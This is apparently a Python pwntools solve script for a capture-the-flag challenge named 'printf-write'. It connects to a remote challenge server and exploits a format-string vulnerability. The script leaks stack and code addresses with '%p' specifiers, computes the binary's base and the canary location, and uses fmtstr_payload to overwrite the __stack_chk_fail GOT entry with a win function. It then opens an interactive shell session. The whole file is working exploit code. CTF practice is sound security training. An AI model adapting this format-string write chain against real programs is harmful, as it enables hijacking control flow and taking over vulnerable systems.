# printf-write — Pwny-CTF (script de solve)
from pwn import *

import argparse

def leak_hex_int(output):	
	import re
	# Match hex values of reasonable length (>= 4 chars to avoid noise)
	matches = re.findall(rb'0x[0-9a-fA-F]{4,}\b', output)
	return [int(m, 16) for m in matches]

  
FILE = "./challenge_patched"
HOST = "chal.sigpwny.com"
PORT = 1372
OFFSET = 6

elf = ELF(FILE, checksec=False)
context.binary = FILE 

conn = remote(HOST, PORT)

payload = b"%525$p %1$p"
conn.sendlineafter(b"? ",payload)
out = conn.recvline()
 
main_addr = leak_hex_int(out)[0]
info(f"{hex(main_addr) = }")

base_addr = main_addr - elf.symbols["main"]
info(f"{hex(base_addr) = }")

elf.address = base_addr

win_addr = elf.symbols["win"]
info(f"{hex(win_addr) = }")

stack_check_fail = elf.got["__stack_chk_fail"]
info(f"{hex(stack_check_fail) = }")

rsi_addr = leak_hex_int(out)[1]
info(f"{hex(rsi_addr) = }")

canary_addr = rsi_addr + 0x36A8
info(f"{hex(canary_addr) = }")

# Write the win_add into stack_check_fail on the GOT and overwrite the value at the stack canary address with 0x0
payload = fmtstr_payload(6, {stack_check_fail: win_addr,canary_addr:0x0}, write_size='byte')

info(f"{len(payload) = }")
conn.sendline(payload)
conn.interactive()
